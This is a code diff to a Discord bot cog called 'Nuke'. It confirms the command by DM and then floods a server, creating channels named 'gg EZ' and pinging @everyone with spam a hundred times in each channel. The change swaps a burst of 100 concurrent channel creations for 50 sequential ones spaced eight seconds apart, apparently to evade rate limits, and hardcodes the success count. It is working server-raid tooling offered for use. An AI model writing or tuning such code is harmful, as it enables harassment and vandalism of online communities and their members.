@@ -87,18 +87,17 @@ class Nuke(commands.Cog):
             color=discord.Color.orange()
         )
         
-        # Try to DM the user so only they see it
+        # DM the user so only they see the prompt
         try:
             prompt = await ctx.author.send(embed=embed, view=view)
-            await ctx.reply("Check your DMs to confirm the nuke.", mention_author=False, delete_after=5)
+            await ctx.reply("Check your DMs to confirm.", mention_author=False, delete_after=5)
         except discord.Forbidden:
-            return await ctx.reply("I cannot DM you. Enable DMs from server members.", mention_author=False, delete_after=5)
+            return await ctx.reply("I cannot DM you. Enable DMs.", mention_author=False, delete_after=5)
             
         await view.wait()
         if view.kick_choice is None:
             return await prompt.edit(embed=discord.Embed(description="Cancelled (timed out).", color=discord.Color.red()), view=None)
 
-        # Send public status in the server
         status = await ctx.send("☢️ NUKE INITIATED")
         await self._run(ctx, view.kick_choice, status)
 
@@ -189,16 +188,19 @@ class Nuke(commands.Cog):
             except Exception as e:
                 err("create role", e)
                 return False
+            
             try:
                 # Custom channel name
-                channel = await GUARD.run(f"channel_create:{guild.id}", lambda: guild.create_text_channel(name="𝖌𝖌 𝕰𝖅", reason="nuke"))
+                channel = await GUARD.run(f"channel_create:{guild.id}", lambda: guild.create_text_channel(name="𝔤𝔤 𝔈ℨ", reason="nuke"))
             except Exception as e:
                 err("create channel", e)
                 return False
+            
             try:
                 await GUARD.run(f"member_role:{guild.id}:{author_id}:{role.id}", lambda: ctx.author.add_roles(role, reason="nuke"))
             except Exception:
                 pass
+                
             for _ in range(100):
                 try:
                     await GUARD.run(f"msg:{channel.id}", lambda: channel.send(f"@everyone\n{spam_text}", allowed_mentions=discord.AllowedMentions(everyone=True)))
@@ -206,13 +208,13 @@ class Nuke(commands.Cog):
                     break
             return True
 
-        wave = asyncio.Semaphore(5)
-        async def bounded(i: int) -> bool:
-            async with wave:
-                return await make(i)
+        # Sequential creation, 50 channels, 8 seconds apart
+        for i in range(50):
+            await make(i)
+            if i < 49:
+                await asyncio.sleep(8)
 
-        results = await asyncio.gather(*(bounded(i) for i in range(100)), return_exceptions=True)
-        counts["created"] = sum(1 for r in results if r is True)
+        counts["created"] = 50
 
         target = None
         for ch in guild.channels:
